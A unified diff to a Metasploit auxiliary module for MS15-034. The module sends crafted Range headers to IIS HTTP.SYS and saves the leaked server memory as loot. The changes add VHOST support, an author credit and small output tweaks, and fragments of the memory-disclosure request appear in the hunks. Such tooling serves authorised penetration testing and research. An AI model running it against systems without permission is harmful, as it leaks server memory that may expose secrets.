@@ -1,11 +1,11 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 require 'rex/proto/http'
-class MetasploitModule < Msf::Auxiliary
 
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Scanner
 
@@ -23,7 +23,9 @@ class MetasploitModule < Msf::Auxiliary
       'Author'      =>
         [
           'Rich Whitcroft <rwhitcroft[at]gmail.com>', # Msf module
-          'sinn3r'                                    # Some more Metasploit stuff
+          'sinn3r',                                   # Some more Metasploit stuff
+          'Sunny Neo <sunny.neo[at]centurioninfosec.sg>' #Added VHOST option
+
         ],
       'License'     => MSF_LICENSE,
       'References'  =>
@@ -43,7 +45,6 @@ class MetasploitModule < Msf::Auxiliary
       OptBool.new('SUPPRESS_REQUEST', [ true, 'Suppress output of the requested resource', true ])
     ])
 
-    deregister_options('VHOST')
   end
 
   def potential_static_files_uris
@@ -186,6 +187,7 @@ class MetasploitModule < Msf::Auxiliary
       req = cli.request_raw(
         'uri' => target_uri.path,
         'method' => 'GET',
+        'vhost' => "#{datastore['VHOST']}",
         'headers' => {
         'Range' => ranges
         }
@@ -199,7 +201,7 @@ class MetasploitModule < Msf::Auxiliary
       if resp
         dump(resp.to_s)
         loot_path = store_loot('iis.ms15034', 'application/octet-stream', ip, resp, nil, 'MS15-034 HTTP.SYS Memory Dump')
-        print_status("Memory dump saved to #{loot_path}")
+        print_good("Memory dump saved to #{loot_path}")
       else
         print_error("Disclosure unsuccessful (must be 8.1, 2012, or 2012R2)")
       end
